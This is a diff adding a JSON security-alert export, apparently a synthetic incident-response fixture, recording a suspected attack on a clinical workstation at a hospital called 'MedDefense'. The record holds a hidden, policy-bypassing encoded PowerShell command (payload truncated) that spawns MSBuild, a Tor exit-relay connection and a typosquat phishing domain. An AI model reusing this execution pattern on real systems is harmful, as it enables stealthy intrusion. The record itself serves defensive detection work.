@@ -1,0 +1,44 @@
+{
+  "export_format": "MedDefense-SIEM-Alert-v1.2",
+  "exported_at": "2026-04-14T02:58:04Z",
+  "exported_by": "soc-evidence-collector",
+  "chain_of_custody_ref": "LH-2026-0414-01",
+  "alert": {
+    "alert_id": "A-20260414-9841",
+    "incident_id": "IR-2026-0414-01",
+    "fired_at": "2026-04-14T02:47:11Z",
+    "rule": {
+      "id": "wz-edr-100041",
+      "name": "Suspicious process tree: PowerShell -> MSBuild",
+      "severity": "high",
+      "mitre_attack": ["T1127.001", "T1059.001"]
+    },
+    "host": {
+      "hostname": "WST-WS-031",
+      "fqdn": "wst-ws-031.meddefense.local",
+      "os": "Windows 10 Pro 22H2",
+      "site": "West Campus",
+      "asset_class": "clinical_workstation"
+    },
+    "user": {
+      "principal": "MEDDEFENSE\\dmarsh",
+      "upn": "dmarsh@meddefense.local",
+      "department": "Laboratory Services"
+    },
+    "process_tree": {
+      "parent": {"image":"powershell.exe","pid":7812,"cmdline":"powershell.exe -ep bypass -w hidden -enc JABzAD0AIgBoAHQAdABwAHMAOgAvAC8AbQBzADAAMwA2ADUA...","sha256":"6f5902ac237024bdd0c176cb93063dc4e2a5e89d4aad51b3b3e4f7b72bce7e5e"},
+      "child": {"image":"MSBuild.exe","pid":8104,"cmdline":"msbuild.exe C:\\Users\\dmarsh\\AppData\\Local\\Temp\\update.xml","sha256":"b2f5b7a7d2b0ec7cc8e4e5a03c6f72d4b1e53d1c4c4fcb9bba9c8a9aa9bba3f1"}
+    },
+    "network": {
+      "remote_ip":"185.220.101.47","remote_port":443,"protocol":"TCP","state":"ESTABLISHED","tags":["tor_exit_relay","anonymizer"]
+    },
+    "correlated_events": [
+      {"type":"proxy","ts":"2026-04-13T18:14:02Z","url":"https://ms0365-support.login-verification.click/auth","note":"Typosquat phishing domain visit 8h prior"},
+      {"type":"edr","ts":"2026-04-14T02:46:41Z","event":"process_create","image":"powershell.exe","pid":7812},
+      {"type":"edr","ts":"2026-04-14T02:46:57Z","event":"process_create","image":"MSBuild.exe","pid":8104,"ppid":7812}
+    ],
+    "analyst_assigned": null,
+    "disposition": "open",
+    "notes": "Auto-exported to evidence store on first analyst acknowledgement per IR playbook PB-CRED-001 step 2.a."
+  }
+}
